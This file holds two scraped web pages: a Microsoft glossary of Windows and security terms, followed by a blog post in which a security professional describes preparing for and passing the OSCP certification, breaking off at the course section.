=== Content from technet.microsoft.com_abab4758_20250126_005637.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/Glossary/glossary.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

# Glossary

* Article
* 10/14/2022
* 3 contributors

Feedback

## In this article

Updated: October, 31 2016

## A

**Active Directory Federation Services (AD FS)**

Active Directory Federation Services (AD FS) is a standards-based service that allows the secure sharing of identity information between trusted business partners (known as a federation) across an extranet. When a user needs to access a web application from one of its federation partners, the user's own organization is responsible for authenticating the user and providing identity information in the form of "claims" to the partner that hosts the web application. The hosting partner uses its trust policy to map the incoming claims to claims that are understood by its web application, which uses the claims to make authorization decisions.

**Address Space Layout Randomization (ASLR)**

Address Space Layout Randomization (ASLR) moves executable images into random locations when a system boots, which helps prevent an attacker from leveraging data at predictable locations. For a component to support ASLR, all components that it loads must also support ASLR. For example, if A.exe consumes B.dll and C.dll, all three must support ASLR. By default, Windows Vista, Windows Server 2008, Windows 7, Windows Server 2008 R2, Windows 8, Windows 8.1, Windows RT, Windows RT 8.1, Windows Server 2012, and Windows Server 2012 R2 will randomize system DLLs and EXEs, but DLLs and EXEs created by Independent Software Vendors (ISVs) must opt in to support ASLR using the /DYNAMICBASE linker option.

ASLR also randomizes heap and stack memory:

When an application creates a heap in Windows Vista, Windows Server 2008, Windows 7, Windows Server 2008 R2, Windows 8, Windows 8.1, Windows RT, Windows RT 8.1, Windows Server 2012, and Windows Server 2012 R2, the heap manager will create that heap at a random location to help reduce the chance that an attempt to exploit a heap-based buffer overrun succeeds. Heap randomization is enabled by default for all applications running on Windows Vista and later.

* When a thread starts in a process linked with /DYNAMICBASE, Windows Vista, Windows Server 2008, Windows 7, Windows Server 2008 R2, Windows 8, Windows 8.1, Windows RT, Windows RT 8.1, Windows Server 2012, and Windows Server 2012 R2 move the thread's stack to a random location to help reduce the chance that a stack-based buffer overrun exploit will succeed.

**Always Encrypted**

Always Encrypted is a feature designed to protect sensitive data, such as credit card numbers or national identification numbers (e.g. U.S. social security numbers), stored in Azure SQL Database or SQL Server databases. Always Encrypted allows clients to encrypt sensitive data inside client applications and never reveal the encryption keys to the Database Engine (SQL Database or SQL Server). As a result, Always Encrypted provides a separation between those who own the data (and can view it) and those who manage the data (but should have no access

**Application Compatibility Infrastructure (AppCompat)**

The Microsoft Windows Application Compatibility Infrastructure (AppCompat) is designed to preserve application functionality as the Microsoft Windows operating system changes from version to version. The AppCompat infrastructure allows for targeted fixes to specific applications and specific versions of applications, with these fixes being stored outside of the core Windows functions.

**ASP.NET**

ASP.NET is a collection of technologies within the Microsoft .NET Framework that enable developers to build Web applications and XML Web Services.

Unlike traditional Web pages, which use a combination of static HTML and scripting, ASP.NET uses compiled, event-driven pages. Because ASP.NET is a Web-based application environment, requiring an underlying Web server to provide basic HTTP functionality, ASP.NET runs on top of Internet Information Services (IIS). For more information, see [The Official Microsoft ASP.NET Site](https://www.asp.net/).

## C

**Certification Authority (CA)**

Certification authorities are the organizations that issue certificates. They establish and verify the authenticity of public keys that belong to people or other certification authorities, and they verify the identity of a person or organization that asks for a certificate.

**Certificate Trust List (CTL)**

A trust must exist between the recipient of a signed message and the signer of the message. One method of establishing this trust is through a certificate, an electronic document verifying that entities or persons are who they claim to be. A certificate is issued to an entity by a third party that is trusted by both of the other parties. So, each recipient of a signed message decides if the issuer of the signer's certificate is trustworthy. CryptoAPI has implemented a methodology to allow application developers to create applications that automatically verify certificates against a predefined list of trusted certificates or roots. This list of trusted entities (called subjects) is called a certificate trust list (CTL). For more information, please see the MSDN article, [Certificate Trust Verification](https://msdn.microsoft.com/en-us/library/aa376546%28v%3Dvs.85%29.aspx).

**Cipher suite**

A cipher suite is a set of cryptographic algorithms. Schannel protocols use algorithms from a cipher suite to create keys and encrypt information. For more information about cipher suites, see [Cipher Suites in Schannel](https://msdn.microsoft.com/en-us/library/windows/desktop/aa374757%28v%3Dvs.85%29.aspx).

**Common Log File System (CLFS)**

The Common Log File System (CLFS) is a high-performance, general-purpose log file subsystem that dedicated client applications can use and multiple clients can share to optimize log access.

**Content Security Policy (CSP)**

Microsoft Edge now implements Content Security Policy (CSP) 1.0. For extended details, see the [W3C Content Security Policy specification](https://www.w3.org/tr/2012/cr-csp-20121115/). The CSP security standard enables web developers to control the resources (JS, CSS, plugins, images, etc.) which a particular page can fetch or execute with the aim of preventing cross-site scripting (XSS), clickjacking, and other code injection attacks seeking to execute malicious content in the context of a trusted web page. With CSP, web developers can create an allow list of sources of trusted content in the HTTP headers, pre-approving certain servers for content loaded into a webpage and instructing the browser to only execute or render resources from those sources.

**Cross-site Request Forgery (CSRF/XSRF)**

Cross-site Request Forgery (CSRF/XSRF) is a type of attack that occurs when a malicious website, email, blog, instant message, or program causes a userâs Web browser to perform an unwanted action on a trusted site for which the user is currently authenticated.

**Cross-site scripting (XSS)**

Cross-site scripting (XSS) is a class of security vulnerability that can enable an attacker to inject script code into a user's session with a website. The vulnerability can affect web servers that dynamically generate HTML pages. If these servers embed browser input in the dynamic pages that they send back to the browser, these servers can be manipulated to include maliciously supplied content in the dynamic pages. This can allow malicious script to be executed. Web browsers may perpetuate this problem through their assumptions of trusted sites and their use of cookies to maintain persistent state with the websites that they frequent. An XSS attack does not modify website content. Instead, it inserts new, malicious script that can execute at the browser in the context that is associated with a trusted server.

**Cryptography**

Cryptography is the science of securing information by converting it between its normal, readable state (called plaintext) and one in which the data is obscured (known as ciphertext).

In all forms of cryptography, a value known as a key is used in conjunction with a procedure called a crypto algorithm to transform plaintext data into ciphertext. In the most familiar type of cryptography, secret-key cryptography, the ciphertext is transformed back into plaintext using the same key. However, in a second type of cryptography, public-key cryptography, a different key is used to transform the ciphertext back into plaintext.

**Cryptography Next Generation (CNG)**

Cryptography Next Generation (CNG) provides a flexible cryptographic development platform to create, update, and use custom cryptography algorithms in cryptography-related applications.

## D

**Defense-in-depth**

In information security, defense-in-depth refers to an approach in which multiple layers of defense are in place to help prevent attackers from compromising the security of a network or system.

**Digital Certificate**

In [public-key cryptography](https://msdn.microsoft.com/en-us/library/92f9ye3s.aspx), one of the keys, known as the private key, must be kept secret. The other key, known as the public key, is intended to be shared with the world. Digital certificates are used primarily to verify the identity of a person or device, authenticate a service, or encrypt files. A digital certificate is a tamperproof piece of data that packages a public key together with information about it - who owns it, what it can be used for, when it expires, and so forth.

**Document Type Definition (DTD)**

DTD, standing for document type definition, is a file format type that is used in XML and other markup languages to identify the markup to be used to format a document.

**Domain Name System (DNS)**

Domain Name System (DNS), a locator service in Microsoft Windows, is an industry-standard protocol that locates computers on an IP-based network. IP networks, such as the Internet and Windows networks, rely on number-based addresses to process data.

## E

**Enhanced Mitigation Experience Toolkit (EMET)**

The Enhanced Mitigation Experience Toolkit (EMET) is designed to help customers with their defense in depth strategies against cyberattacks, by helping detect and block exploitation techniques that are commonly used to exploit memory corruption vulnerabilities. EMET helps protect against new and undiscovered threats even before they are formally addressed through security updates or antimalware software. EMET includes 14 security mitigations that complement other defense in-depth security measures, such as Windows Defender and antivirus software. EMET installs with default protection profiles, which are XML files that contain preconfigured settings for common Microsoft and third-party applications. For more information about EMET, see the [Enhanced Mitigation Experience Toolkit](https://technet.microsoft.com/security/jj653751).

**Enhanced Metafile (EMF)**

EMF is a 32-bit format that can contain both vector information and bitmap information. This format is an improvement over the Windows Metafile Format (WMF) and contains extended features.

For more information about image types and formats, see [Microsoft Knowledge Base Article 320314](https://support.microsoft.com/kb/320314). For additional information about graphics file formats, see MSDN article, [Metafiles](https://msdn.microsoft.com/en-us/library/ms536391.aspx).

## H

**HTML Injection**

HTML injection is a class of security vulnerability that can enable an attacker to inject HTML code into a user's session with a website. The vulnerability can affect web servers that dynamically generate HTML pages. If these servers embed browser input in the dynamic pages that they send back to the browser, these servers can be manipulated to include maliciously supplied content in the dynamic pages. This can allow malicious script to be executed. Web browsers may perpetuate this problem through their assumptions of trusted sites and their use of cookies to maintain persistent state with the websites that they frequent. An HTML injection attack does not modify website content. Instead, it inserts new, malicious HTML code that can execute at the browser in the context that is associated with a trusted server.

**Hypervisor-protected code integrity (HVCI)**

Hypervisor-protected code integrity (HVCI) is a powerful system mitigation that leverages hardware virtualization and the Windows Hyper-V hypervisor to protect Windows kernel-mode processes against the injection and execution of malicious or unverified code. When HVCI is on, kernel mode code integrity validation is performed in a secure environment that is resistant to attack from malicious software, and page permissions for kernel mode are set and maintained by the Hyper-V hypervisor.

## I

**Internet Authentication Service (IAS)**

In Microsoft Windows 2000 Server, Internet Authentication Service (IAS) is the Microsoft implementation of a Remote Authentication Dial-in User Service (RADIUS) server. As a RADIUS server, IAS performs centralized connection authentication, authorization, and accounting for many types of network access, including wireless and virtual private network (VPN) connections. On Microsoft Windows 2000 Server, IAS does not support RADIUS Proxy because it is based on the Option Pack version.

In Windows Server 2003, Internet Authentication Service (IAS) is the Microsoft implementation of a Remote Authentication Dial-in User Service (RADIUS) server and proxy. As a RADIUS server, IAS performs centralized connection authentication, authorization, and accounting for many types of network access, including wireless and virtual private network (VPN) connections. As a RADIUS proxy, IAS forwards authentication and accounting messages to other RADIUS servers.

**Internet Protocol Security (IPSec)**

Internet Protocol security (IPSec) is a framework of open standards for helping to ensure private, secure communications over Internet Protocol (IP) networks through the use of cryptographic security services. IPSec supports network-level data integrity, data confidentiality, data origin authentication, and replay protection. Because IPSec is integrated at the Internet layer (layer 3), it provides security for almost all protocols in the TCP/IP suite, and because IPSec is applied transparently to applications, there is no need to configure separate security for each application that uses TCP/IP.

**Input Method Editor (IME)**

Input Method Editors (IMEs) help solve an issue associated with entering information in certain languages via a keyboard. Languages like Chinese and Japanese contain thousands of different characters, and it isn't feasible to build a keyboard that includes all of them. IMEs allow the characters to be built using a standard 101-key keyboard, by specifying the strokes that compose each character.

An IME consists of an engine that converts keystrokes into phonetic and ideographic characters and a dictionary of commonly-used ideographic words. As the user enters keystrokes via the keyboard, the IME identifies the keystrokes and converts them into characters.

**Input/Output Control (IOCTL)**

Windows provides the ability for applications to directly request services of device drivers. The interface through which this is done is called an input/output control, or IOCTL.

**Internet Information Service (IIS)**

The Web Server (IIS) role in Windows Server provides a secure, easy-to-manage, modular and extensible platform for reliably hosting websites, services, and applications. For more information, see the TechNet article, [Web Server IIS Overview](https://technet.microsoft.com/library/hh831725.aspx).

**IP Address and Domain Restrictions**

IP Address and Domain Restrictions is a Web Server (IIS) feature that allows the creation of rules that allow or deny access to content for a specific IP address, a range of IP addresses, or a domain name or set of domain names. These rules are also known as "white list" or âblack listâ rule sets.

All IP addresses, computers, and domains can access your site by default. To enhance security, you can restrict access to your site by creating a restriction rule for all IP addresses, a specific IP address, a range of IP addresses, or a specific domain or domains.

For example, if you have a site on an intranet server that is connected to the Internet, you can prevent Internet users from accessing your intranet site by allowing access only to members of your intranet, and explicitly denying access to outside users, see the article, [IP security](https://www.iis.net/configreference/system.webserver/security/ipsecurity).

## J

**JPEG**

JPEG is a platform-independent image format that supports a high level of compression. JPEG is a widely supported Internet standard developed by the Joint Photographic Experts Group.

**JPEG XR**

JPEG XR (.XJR) is a Microsoft-developed JPEG file format for continuous tone images that supports higher compression ratios and color accuracy than the standard JPEG format.

## K

**Kerberos**

Kerberos is a protocol that is used to mutually authenticate users and services on an open and unsecured network. It allows services to correctly identify the user of a Kerberos ticket without having to authenticate the user at the service. It does this by using shared secret keys.

The Kerberos protocol uses shared secret keys to encrypt and sign users' credentials. A client is authenticated by a Kerberos Key Distribution Center (KDC). After that authentication, the user can request a service ticket to access a specific service on the network. This ticket includes the encrypted and signed identity of the user.

Kerberos Key Distribution Center (KDC) is a network service that supplies session tickets and temporary session keys to users and computers within an Active Directory domain. The KDC runs on each domain controller as part of Active Directory Domain Services (AD DS).

**Kill Bits**

A security feature in Microsoft Internet Explorer makes it possible to prevent an ActiveX control from ever being loaded by the Internet Explorer HTML-rendering engine. This is done by making a registry setting and is referred to as setting the kill bit. After the kill bit is set, the control can never be loaded, even when it is fully installed. Setting the kill bit makes sure that even if a vulnerable component is introduced or is re-introduced to a system, it remains inert and harmless.

For more information on kill bits, see [Microsoft Knowledge Base Article 240797](https://support.microsoft.com/kb/240797).

## M

**Man-in-the-middle (MiTM) attack**

A man-in-the-middle (MiTM) attack occurs when an attacker reroutes communication between two users through the attackerâs computer without the knowledge of the two communicating users. Each user in the communication unknowingly sends traffic to and receives traffic from the attacker, all the while thinking they are communicating only with the intended user.

**Microsoft .NET Remoting**

Microsoft .NET Remoting is a technology that simplifies how applications communicate and share objects with other applications.

**Microsoft DirectShow**

DirectX consists of a set of low-level Application Programming Interfaces (APIs) used by Windows programs for multimedia support. Within DirectX, the DirectShow technology performs client-side audio and video sourcing, manipulation and rendering.

Microsoft DirectShow is used for streaming media on Microsoft Windows operating systems. DirectShow is used for high-quality capture and playback of multimedia streams. It automatically detects and uses video and audio acceleration hardware when available, but also supports systems without acceleration hardware. DirectShow is also integrated with other DirectX technologies. Some examples of applications that use DirectShow include DVD players, video editing applications, AVI to ASF converters, MP3 players, and digital video capture applications.

**Microsoft XML Core Services (MSXML)**

Microsoft XML Core Services (MSXML) allows customers who use JScript, Visual Basic Scripting Edition (VBScript), and Microsoft Visual Studio 6.0 to develop XML-based applications that provide interoperability with other applications that adhere to the XML 1.0 standard. For more information, see the MSDN site, [MSXML](https://msdn.microsoft.com/en-us/library/ms763742.aspx).

**Mitigation**

Refers to a setting, common configuration, or general best-practice, existing in a default state that could reduce the severity of exploitation of a vulnerability.

## N

**Network Driver Interface Standard (NDIS)**

The Network Driver Interface Standard (NDIS) is part of the Windows Driver Kit, which is a fully integrated driver development system that contains the Windows Driver Device Kit and tests for stability and reliability of Windows drivers. The NDIS library abstracts the network hardware from network drivers. NDIS also specifies a standard interface between layered network drivers, thereby abstracting lower-level drivers that manage hardware from upper-level drivers, such as network transports. NDIS also maintains state information and parameters for network drivers, including pointers to functions, handles, and parameter blocks for linkage, and other system values.

**Network Location Awareness (NLA) service**

The Network Location Awareness service enables network-interacting programs to change their behavior based on how the computer is connected to the network. In the case of Windows Firewall with Advanced Security, you can create rules that apply only when the profile associated with a specific network location type is active on your computer.

**Network Policy Server (NPS)**

Network Policy Server (NPS) is the Microsoft implementation of a Remote Authentication Dial-in User Service (RADIUS) server and proxy in Windows Server 2008. NPS is the replacement for Internet Authentication Service (IAS) in Windows Server 2003. As a RADIUS server, NPS performs authentication, authorization, and accounting for wireless, authenticating switch, and remote access dial-up and virtual private network (VPN) connections.

**NT LAN Manager (NTLM) Authentication Protocol**

NT LAN Manager (NTLM) Authentication Protocol is a protocol that uses a challenge-response mechanism for authentication in which clients are able to verify their identities without sending a password to the server. It consists of three messages, commonly referred to as Type 1 (negotiation), Type 2 (challenge), and Type 3 (authentication).

## O

**Object Linking and Embedding (OLE)**

A technology that allows applications to share data and functionality, such as the ability to create and edit compound data. Compound data is data that contains information in multiple formats. For example, a compound Microsoft Word document may contain an embedded Microsoft Excel spreadsheet (or OLE object). This technology also enables in-place editing; instead of launching a new application when an OLE object is activated, the user instead sees a new set of menu items inside their existing application. For more information about OLE, see [Compound Documents](https://msdn.microsoft.com/library/ms693383).

## P

**PFS**

PFS is a property of key-agreement protocols that makes sure that a session key derived from a set of long-term keys will not be compromised if one of the long-term keys is compromised in the future.

**PGM**

PGM is a reliable and scalable multicast protocol that enables receivers to detect loss, request retransmission of lost data, or notify an application of unrecoverable loss. PGM is a receiver-reliable protocol, which means the receiver is responsible for ensuring all data is received, absolving the sender of responsibility for the reliability of communications. PGM is appropriate for applications that require duplicate-free multicast data delivery from multiple sources to multiple receivers. PGM does not support acknowledged delivery, nor does it guarantee ordering of packets from multiple senders. For more information on PGM, see the following [MSDN Article](https://msdn.microsoft.com/en-us/library/ms740125%28vs.85%29.aspx).

**PNG**

PNG stands for Portable Network Graphics. The Portable Network Graphics (PNG) format was designed to replace the older and simpler GIF format and, to some extent, the much more complex TIFF format. Additional information about PNG can be found at the following [website](https://www.libpng.org/pub/png/pngintro.html).

## R

**Remote Authentication Dial-in User Service (RADIUS)**

Remote Authentication Dial-In User Service (RADIUS) is a client-server networking protocol that provides centralized Authentication, Authorization, and Accounting (AAA or Triple A) management for users who connect to a network service. RADIUS provided a central authentication and authorization service for all access requests that are sent by RADIUS clients. The RADIUS protocol manages access to the Internet or internal networks, wireless networks, and integrated e-mail services. These networks may incorporate modems, DSL, access points, VPNs, network ports, web servers, etc. Network Policy Server (NPS) can be used as a Remote Authentication Dial-In User Service (RADIUS) server to perform authentication, authorization, and accounting for RADIUS clients.

**Remote Desktop Protocol (RDP)**

Remote Desktop Protocol (RDP) lets users create a virtual session on their desktop computers. RDP allows remote users to access all of the data and applications on their computers. For more information, see the MSDN article, [Remote Desktop Protocol](https://msdn.microsoft.com/en-us/library/aa383015%28v%3Dvs.85%29.aspx).

**Remote Procedure Call (RPC)**

Microsoft Remote Procedure Call (RPC) is an inter-process communication (IPC) mechanism that enables data exchange and invocation of functionality residing in a different process. That process can be on the same computer, on the local area network (LAN), or across the Internet. The Microsoft RPC mechanism uses other IPC mechanisms, such as named pipes, NetBIOS, or Winsock, to establish communications between the client and the server. With RPC, essential program logic and related procedure code can exist on different computers, which is important for distributed applications. For more information, see the TechNet article, [What Is RPC?](https://technet.microsoft.com/library/cc787851)

**RPC NDR Engine**

The Remote Procedure Call (RPC) Network Data Representation (NDR) Engine is the marshaling engine of the RPC and DCOM components. The NDR Engine handles all stub-related issues of a remote call. As a process, NDR marshaling is driven by the C code from MIDL-generated stubs, a MIDL JIT-type generator, or by stubs generated by other tools or written manually. In turn, the NDR engine drives the underlying run time (DCOM or RPC) that communicates with specific transports.

## S

**Same Origin Policy**

The same-origin policy is used by web browsers to prevent a script loaded from one domain from getting or manipulating properties of a webpage from another domain. This means that, by default, the domain of a requested URL must be the same as the domain of the current webpage.

**Secure Channel (Schannel)**

The Secure Channel (Schannel) security package is a Security Support Provider (SSP) that implements the Secure Sockets Layer (SSL) and Transport Layer Security (TLS) Internet standard authentication protocols. These components are used to implement secure communications in support of several common internet and network applications, such as web browsing. Schannel is part of the security package that helps provide an authentication service to provide secure communications between client and server. For more information, see [Secure Channel](https://msdn.microsoft.com/en-us/library/aa380123%28vs.85%29.aspx).

**Secure Sockets Layer (SSL)**

The Secure Sockets Layer (SSL) protocol is a predecessor of the Transport Layer Security protocol. It performs the same functions and supports secure network communications using a combination of public and secret key technology. For more information, see How [TLS/SSL works](https://technet.microsoft.com/en-us/library/cc783349%28ws.10%29.aspx).

**Server Side Request Forgery (SSRF)**

Server Side Request Forgery (SSFR) is a type of attack that can allow an attacker to target internal systems behind the firewall that are normally inaccessible from the outside world. The attacker could then create requests which appear to come from the vulnerable server. In addition, an attacker can use SSRF attacks to:

* Scan and attack systems from the internal network that are not normally accessible
* Enumerate and attack services that are running on these hosts
* Exploit host-based authentication services

## T

**Task Scheduler**

Task Scheduler is a Windows feature that enables you to automatically perform routine tasks on a chosen computer. The Task Scheduler can be used to execute tasks such as starting an application, sending an email message, or showing a message box.

**Telnet**

By using Telnet Client and Telnet Server, you can run command-line programs, shell commands, and scripts in a remote command console session just as though you were locally logged on to the remote host.

**Transport Layer Security (TLS) Handshake Protocol**

The Transport Layer Security (TLS) Handshake Protocol is responsible for the authentication and key exchange necessary to establish or resume secure sessions. For more information, see How [TLS/SSL works](https://technet.microsoft.com/en-us/library/cc783349%28ws.10%29.aspx).

**Trusted Boot**

Trusted Boot is a Windows 8.1 feature that secures the entire Windows boot process. It prevents malware from hiding and taking up permanent residence within the PC by ensuring none of the Windows components loaded during boot have been tampered with. Trusted Boot also ensures that anti-malware software is loaded before any third-party drivers and applications using its Early Launch Anti-Malware (ELAM) capability. This prevents malware from inserting itself in front of the anti-malware engine so that it can compromise the anti-malware engineâs ability to protect the system. In the event that malware was able to successfully compromise the any of the Windows boot process, Trusted Boot will attempt to automatically remediate the issue.

## U

**Uniscribe**

Uniscribe is a set of APIs that allow a high degree of control for fine typography and for processing complex scripts. Both complex scripts and simple scripts with fine typography effects require special processing to display and edit because the characters ("glyphs") are not laid out in a simple way. For complex scripts, the rules governing the shaping and positioning of glyphs are specified and catalogued in [The Unicode Standard](https://go.microsoft.com/fwlink/p/?linkid=161643). For more information see [Uniscribe](https://msdn.microsoft.com/en-us/library/windows/desktop/dd374091%28v%3Dvs.85%29.aspx).

## V

**VBScript**

VBScript (Visual Basic Script) is an interpreted, object-based scripting language that is often used to make websites more flexible or interactive. VBScript scripts can run only in the presence of an interpreter or host, such as Active Server Pages (ASP), Internet Explorer, or Windows Script Host. For more information, see [VBScript Fundamentals](https://msdn.microsoft.com/library/0ad0dkea).

## W

**WebDAV**

Web Distributed Authoring and Versioning (WebDAV) is an extension to the Hypertext Transfer Protocol (HTTP) that defines how basic file functions such as copy, move, delete and create are performed by a computer using HTTP.

**WebDAV Redirector**

A WebDAV Redirector is a remote file system over the WebDAV protocol that allows Windows client machines to connect to your WebDAV publishing directory through the command line. The WebDAV Redirector enables you to manipulate files on the Web as though the files exist on a mapped network drive.

**WebDAV Mini-Redirector**

The WebDAV Mini-Redirector is also known as the WebClient service. This service lets DAV-enabled folders appear as Universal Naming Convention (UNC) shares.

**Windows Error Reporting**

Windows Error Reporting (WER) is a flexible event-based feedback infrastructure designed to gather information about the hardware and software problems that Windows can detect, report the information to Microsoft, and provide users with any available solutions. For more information about WER, see the Microsoft Developer Network (MSDN) article [About WER](https://msdn.microsoft.com/library/windows/desktop/bb513613%28v%3Dvs.85%29.aspx).

**Windows Forms (WinForms)**

Windows Forms is a smart client technology for the .NET Framework, a set of managed libraries that simplify common application tasks such as reading and writing to the file system. When you use a development environment like Visual Studio, you can create Windows Forms smart-client applications that display information, request input from users, and communicate with remote computers over a network. For more information, see [Windows Forms Overview](https://msdn.microsoft.com/en-us/library/8bxxy49h.aspx).

**Windows kernel**

The Windows kernel is the core of the operating system. It provides system-level services such as device management and memory management, allocates processor time to processes, and manages error handling.

**Windows kernel-mode driver (win32k.sys)**

Win32k.sys is a kernel-mode device driver and is the kernel part of the Windows subsystem. It contains the window manager, which controls window displays; manages screen output; collects input from the keyboard, mouse, and other devices; and passes user messages to applications. It also contains the Graphics Device Interface (GDI), which is a library of functions for graphics output devices. Finally, it serves as a wrapper for DirectX support that is implemented in another driver (dxgkrnl.sys).

**Windows Registry Virtualization**

Windows Registry Virtualization is an application compatibility technology that enables registry write operations that have global impact to be redirected to per-user locations. This redirection is transparent to applications reading from or writing to the registry.

**Windows Shell**

The Windows UI provides users with access to a wide variety of objects necessary for running applications and managing the operating system. The most numerous and familiar of these objects are the folders and files that reside on computer disk drives. There are also a number of virtual objects that allow the user to perform tasks such as sending files to remote printers or accessing the Recycle Bin. The Shell organizes these objects into a hierarchical namespace and provides users and applications with a consistent and efficient way to access and manage objects.

**Workaround**

Refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update.

**Web Proxy Automatic Discovery (WPAD) protocol**

The Web Proxy Automatic Discovery (WPAD) protocol allows automatic discovery of Web Proxy servers. WPAD provides a mechanism for clients to locate a WPAD entry containing a URL that points to a server on which the Wpad.dat and Wspad.dat files are generated. The Wpad.dat file is a JavaScript file containing a default URL template, constructed by Internet Explorer. The Wpad.dat file is used by Web Proxy clients for automatic discovery information.

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from www.securitysift.com_c984cb07_20250126_005640.html ===


* [Home](https://www.securitysift.com/)
* [About](https://www.securitysift.com/about/)
* [My Library](https://www.securitysift.com/my-library/)

# [Security Sift](https://www.securitysift.com/)

Sifting through the world of Information Security, one bit at a time

Sift: to examine (something) thoroughly so as to isolate that which is most important -- Oxford Dictionary

Google
# Offensive Security’s PWB and OSCP — My Experience

![](http://www.securitysift.com/wp-content/uploads/2012/09/mike_czumak.jpg)
Written on:[October 9, 2013](https://www.securitysift.com/2013/10/09/)
Comments are closed

[![cert-logo-oscp](http://www.securitysift.com/wp-content/uploads/2013/10/cert-logo-oscp.png)](http://www.securitysift.com/wp-content/uploads/2013/10/cert-logo-oscp.png)

### Overview

Recently I took the Offensive Security Penetration Testing with Backtrack (PWB) course, passed the exam, and achieved the OSCP certification.  I learned a ton and earned my most rewarding cert yet.  There are several great reviews of the course but I figured I’d provide my perspective.

### Motivations

In my current job I’m lucky enough to touch on all aspects of information security from policy and process development to application security testing. The latter (which is where I spend the majority of my time) requires that I keep my technical skills sharp.  I’m a big believer in training that takes a hands-on approach.  I’ve attended SANS training before but I had recently heard many good things about Offensive Security. The pricing of the courses made it an easy sell and the 90+ days of available lab time (you can extend it if desired) meant it would not be another cram-session course.  After reading several online reviews I decided this would be the next professional development course for me.

### Course Registration

You can register for 30, 60, or 90 days of lab time — I chose 90. I registered in mid-June of this year and the timing was less than ideal as my wife was approaching her third trimester of pregnancy — meaning my anticipated exam time would be about two weeks before the baby was due. Definitely not the best for my stress levels but I knew that if I didn’t squeeze it in now, I might not have a chance to get it done for a while. Registration requires the use of a non-free email address (no gmail, yahoo, etc). Once you’ve applied for registration, you’ll receive an email with some basic instructions and a link to continue the registration process. If you proceed, you’ll receive a lab connectivity guide and software to test the VPN connectivity. They ask you do this before you submit any payment to ensure you will have no problems accessing the lab environment. Once you’ve successfully tested your connection you can submit your payment. On the first day of your scheduled course, you’ll receive an email with some more instructions as well as the course materials (pdf course guide and videos).  You can visit the FAQ page which contains additional information about the registration process here: <http://www.offensive-security.com/faq/>

### Course Prerequisites

The prerequisites for PWB as cited by Offsec are “a solid understanding of TCP/IP, networking and reasonable Linux skills”.  With that knowledge you should have no problem getting through the course but I do have some additional recommendations for prospective students to ensure you get the most out of your course time:

##### You should be comfortable with scripting.

I use scripting regularly in my day-to-day work and it proved very valuable during the course. You’ll find yourself repeating enumeration steps over and over and automating tasks via scripting saves so much time.  What language you choose is pretty much up to you but the majority of exploits you’ll run across will probably be written in either Python or Perl.  The course does cover bash scripting but it can’t hurt to familiarize yourself with it ahead of time if it’s not one of your strong suits.

##### You should be comfortable with Linux and Windows command line syntax.

This wasn’t an issue for me, but if necessary, take some time to ensure you can navigate the CL in both OS’s. There’s a lot of material covered in the PWB course so you don’t want to be struggling with the basics at the same time.

##### You should be familiar with Assembly and a debugger

Since buffer overflows are just one of the many topics you’ll cover in the course this might be the least important of the recommendations but I think if you have some knowledge of Assembly and using a debugger you’ll be ahead of the game.  If you want to take a free crash course on Assembly check out [http://www.securitytube.net](http://www.securitytube.net/).  I recommend the Assembly Language Megaprimer for Linux, the Windows Assembly Language Megaprimer, and the Buffer Overflow Exploitation Megaprimer for Linux.  If you watch and comprehend these video series, you should have no problem tackling the basic buffer overflow exploits presented in the PWB course.

##### Get your “attacking” machine up and running.

The course recommends the last version of Backtrack but I used the newest version of Kali with no problems.  The directory structure is organized a bit differently so you’ll have to adapt accordingly when following along with the video lessons but it’s no big deal. I personally prefer virtualization so I used a Macbook Pro running a Kali VM on VirtualBox. I would recommend updating the VM before you start the course and once you have everything working, don’t touch it again until after you’ve completed the exam. You don’t want a failed software update or misconfiguration to derail your progress.

##### Devise an organized note-taking and backup approach.

Clear, thorough, and organized notes are a key to success. You’re going to cover a lot of material in a relatively short amount of time and when it comes time for the exam, you’ll be glad you kept yourself organized. I used KeepNote to organize all of my notes. It’s cross-platform (Windows, Mac, Linux), comes pre-installed on Kali and is very flexible.

As I went through the course, I took notes and organized them accordingly.

[![KeepNote1](http://www.securitysift.com/wp-content/uploads/2013/10/KeepNote1.bmp)](http://www.securitysift.com/wp-content/uploads/2013/10/KeepNote1.bmp)

When it came time to tackle the lab systems, I used a similar approach, tracking the enumeration and exploit activities for each machine, in detail. This proved valuable when it came time to write the report.

[![KeepNote2](http://www.securitysift.com/wp-content/uploads/2013/10/KeepNote2.bmp)](http://www.securitysift.com/wp-content/uploads/2013/10/KeepNote2.bmp)

To ensure my notes were constantly backed up, I synced my KeepNote files with Dropbox (via a auto-sync folder on my host OS). This is also where I kept my PWB lab/exam report and backup copies of my screenshots. This way, I could access them from any machine and ensure I always had the most current copies. I also took regular snapshots of my Kali VM.

### The Course

